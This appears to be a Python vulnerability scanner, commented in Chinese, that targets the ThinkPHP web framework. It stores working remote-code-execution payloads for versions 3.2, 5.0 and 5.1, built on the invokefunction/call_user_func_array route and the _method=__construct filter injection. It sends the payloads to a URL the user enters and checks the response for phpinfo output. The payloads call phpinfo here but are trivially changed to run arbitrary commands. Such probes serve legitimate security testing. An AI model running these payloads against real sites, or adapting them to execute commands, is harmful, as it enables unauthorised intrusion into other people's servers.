# coding=utf-8
# Author: HSJ
# 2024/3/7 14:16
import sys
import time
sys.path.append("../../")  # 由于common不在同一层，所以需要添加路径,才能找到对应的模块
from common import DoRequest
class thinkphp_vul(object):
    def __init__(self):
        self.__choose_list = []
        self.__version_list = [
            {
                'TP_3.2.x': [
                    {'payloads': r's=-1&_method=__construct&method&filter[]=phpinfo', 'method': 'POST'},
                    {'payloads': r'?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1','method': 'GET'}
                ]
            },
            {
                'TP_5.0.x': [
                    {'payloads': r's=-1&_method=__construct&method&filter[]=phpinfo', 'method': 'POST'},
                    {'payloads': r'?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1', 'method': 'GET'}
                ]
            },
            {
                'TP_5.1.x':[
                    {'payloads': r'?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1', 'method': 'GET'},
                    {'payloads': r'?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1', 'method': 'GET'}
                ]
            }
        ]

    def __get_choose_list(self):
        # 先将所有的版本显示出来
        # 准备一个初始的序号
        index = 1
        for version in self.__version_list:
            v = list(version.keys())[0]
            v = {index: v}
            self.__choose_list.append(v)
            index += 1
        self.__choose_list.append({index: "探测所有版本"})


    def __get_choose_version(self, key):
        """
        拿到用户选择的版本
        :param key:
        :return:
        """
        for c in self.__choose_list:
            if list(c.keys())[0] == key:
                return c[key]

    def __get_choose_payloads(self, key):
        """
        根据用户选择的版本取获取payloads
        :param key:
        :return:
        """
        if key == "探测所有版本":
            version_list_all = []
            # 遍历所有的版本
            for v in self.__version_list:
                version_list_all += list(v.values())[0]
            return version_list_all
        else:
            for v in self.__version_list:
                if list(v.keys())[0] == key:
                    return v[key]

    def __verify_response(self, html):
        """
        验证响应体
        :return:
        """
        if 'PHP Version' in html and 'Server API' in html and 'PHP Extension' in html:
            return True
        else:
            return False


    def start(self):
        self.__get_choose_list()
        # 将选择列表打印
        print("请选择探测的版本：")
        for item in self.__choose_list:
            k = list(item.keys())[0]
            print(k, ":", item[k])
        choose = int(input("请输入选择的版本号："))
        # 取出真正的版本
        choose_version = self.__get_choose_version(choose)
        # 根据用户选择的版本去取payloads
        payloads = self.__get_choose_payloads(choose_version)
        # 用户输入探测的网址
        url = input("请输入要探测的url：")
        # 去请求
        for p in payloads:
            if p['method'] == 'POST':
                pass
            elif p['method'] == 'GET':
                res = DoRequest.do_get_vul(url+p['payloads'])
                # 验证响应体  http://www.tp351.com
                content = res['content']
                if self.__verify_response(content):
                    print("发现漏洞，地址为：", url+p['payloads'])
